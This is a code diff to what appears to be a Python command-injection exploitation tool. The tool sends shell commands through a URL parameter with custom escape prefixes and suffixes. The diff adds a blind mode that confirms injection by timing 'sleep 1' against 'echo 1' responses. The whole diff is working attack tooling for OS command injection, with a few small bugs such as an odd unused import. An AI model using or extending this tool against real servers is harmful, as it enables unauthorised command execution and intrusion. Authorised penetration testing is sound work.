@@ -5,6 +5,7 @@ import string
 import argparse
 from html import unescape
 
+from urllib import response
 import urllib.parse
 from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
 import requests
@@ -58,7 +59,7 @@ def set_query_param(address: str, key: str, value: str) -> str:
     new_query = urlencode(query)
     return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))
     
-def send_command(command):
+def send_command(command, raw_response=False):
     wrapped_command = command
     start_marker = end_marker = None
     
@@ -90,6 +91,9 @@ def send_command(command):
     pinfo(f"Status code: {response.status_code}")
     pinfo(f"Response size: {len(response.text)}")
     
+    if raw_response:
+        return response
+    
     if response.status_code != 200:
         palert(f"Command execution failed with status code: {response.status_code} and response: {response.text}")
         return None
@@ -104,8 +108,7 @@ def send_command(command):
 
 def preflight_request():
     if blind:
-        pinfo("Blind mode enabled, skipping preflight checks.")
-        return True
+        return blind_preflight_request()
     
     preflight_random = random_string(16)
     preflight_echo = f"echo {preflight_random}"
@@ -117,6 +120,37 @@ def preflight_request():
     if preflight_random not in response:
         palert(f"Preflight request failed: Could not verify command output.")
         return False
+    return True
+
+def blind_preflight_request():
+    time = 1 # seconds
+    delta_buffer = time * 0.8 # 20% buffer to account for network latency and processing time
+    preflight_slow_command = f"sleep {time}"
+    preflight_fast_command = f"echo {time}"
+    
+    # Fast command speed
+    pinfo("Performing blind preflight check: Sending a fast command to measure response time using command: " + preflight_fast_command)
+    fast_response = send_command(preflight_fast_command, raw_response=True)
+    fast_time = fast_response.elapsed.total_seconds()
+    pinfo(f"Fast command response time: {fast_time}s")
+    if fast_response is None or fast_response.status_code != 200:
+        palert(f"Blind preflight request failed: Could not execute command. Response: {fast_response}")
+        return False
+    
+    # Slow command speed
+    pinfo("Performing blind preflight check: Sending a slow command to measure response time using command: " + preflight_slow_command)
+    slow_response = send_command(preflight_slow_command, raw_response=True)
+    slow_time = slow_response.elapsed.total_seconds()
+    pinfo(f"Slow command response time: {slow_time}s")
+    if slow_response is None or slow_response.status_code != 200:
+        palert(f"Blind preflight request failed: Could not execute command. Response: {slow_response}")
+        return False
+    
+    # Analyze response times
+    if slow_time < fast_time + delta_buffer:
+        palert(f"Blind preflight request failed: Response time difference between `echo {time}` and `sleep {time}` is too small. Fast time: {fast_time}s, Slow time: {slow_time}s. This may indicate that command execution is not working properly or that the server is not processing the commands as expected.")
+        return False
+    
     return True
 
 
@@ -165,7 +199,7 @@ def main():
     parser.add_argument("--agent", help="Set a custom User-Agent header for the requests")
     parser.add_argument("--prefix", "-P", help="Set a custom prefix for the commands. This is usually the command escape. By default there is none.")
     parser.add_argument("--suffix", "-S", help="Set a custom suffix for the commands. This is usually the command escape. By default there is none.")
-    parser.add_argument("--blind", "-b", action="store_true", help="Enable blind command execution (no output returned)")
+    parser.add_argument("--blind", "-b", action="store_true", help="Enable blind command execution (no output returned). The preflight checks will be adapted to detect blind command execution based on response times.")
 
 
     parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
